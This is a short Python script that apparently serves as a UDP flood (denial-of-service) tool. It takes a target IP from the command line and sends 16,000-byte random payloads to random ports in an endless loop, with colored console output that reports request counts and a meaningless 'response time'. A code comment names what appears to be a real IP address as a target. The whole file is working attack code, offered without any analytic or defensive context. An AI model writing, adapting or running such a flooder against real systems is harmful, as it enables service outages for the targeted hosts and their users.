from colorama.initialise import init
import requests, socket, random, threading, colorama, sys, sched, time
from time import sleep
from time import process_time
from colorama import Fore
colorama.init()

s = sched.scheduler(time.time, time.sleep)

class colors:
    green = Fore.GREEN
    blue = Fore.BLUE
    gray = Fore.LIGHTBLACK_EX
    red = Fore.RED
    reset = Fore.RESET
    yellow = Fore.YELLOW

class info:
    try:
        TCP_IP = str(sys.argv[1]) #69.162.108.171
    except IndexError:
        print(f"[ {colors.red}! {colors.reset}] {colors.gray} WRONG FORMAT | python3 example.py 1.1.1.1")
        exit(0)

    BUFFER_SIZE = 1024
    bytes = random._urandom(16000)
    TRAN = "\x41\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"*random.randint(0,100*2832)+"\xee\x53"


def main():
    count = 1
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while 1:
        print(info.TCP_IP)
        t1_start = process_time()
        #info.MESSAGE = "\x41\x30\x30\x30"*random.randint(0,1000)+"\xee\x53"

        TCP_PORT = random.randint(1,65535)
        s.sendto(info.bytes, (info.TCP_IP, TCP_PORT))
        
       	count += 1
        s.close
        t1_stop = process_time()

        print(f'[ {colors.blue}= {colors.reset}] sending ({colors.yellow}{len(info.TRAN)}{colors.reset}) Bs to {colors.gray}{info.TCP_IP}:{TCP_PORT}{colors.reset} ')
        
        # ping back 
        print(f'[ {colors.green}? {colors.reset}] response time {colors.gray}{t1_stop - t1_start}{colors.reset}| REQS ({colors.red}{count}{colors.reset})\n')
       



if __name__ == "__main__":
     try:
        for _ in range(200):
            t1 = threading.Thread(target=main, name='seconds')
            t1.start()
            t1.join()
     except KeyboardInterrupt:
         exit(0)